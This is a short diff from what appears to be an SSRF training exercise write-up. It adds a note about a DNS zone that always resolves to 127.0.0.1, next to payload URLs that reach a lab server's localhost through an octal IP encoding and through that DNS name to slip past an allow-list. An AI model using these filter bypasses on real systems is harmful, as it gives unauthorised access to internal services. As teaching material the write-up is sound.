@@ -21,6 +21,8 @@ To do convert an IPv4 address like 127.0.0.1 into a single-integer octal equival
 libcurl.me/?url=http://017700000001:1234/
 
 # the developer blocked everything that doesn't match
+[We setup a special DNS zone that will always answer 127.0.0.1 for any host in --
+the domain hackingwithpentesterlab.link.That will probably help you.]
 libcurl.me/?url=http://assets.pentesterlab.com.hackingwithpentesterlab.link:1234/hacker.txt
 </code></pre>
 
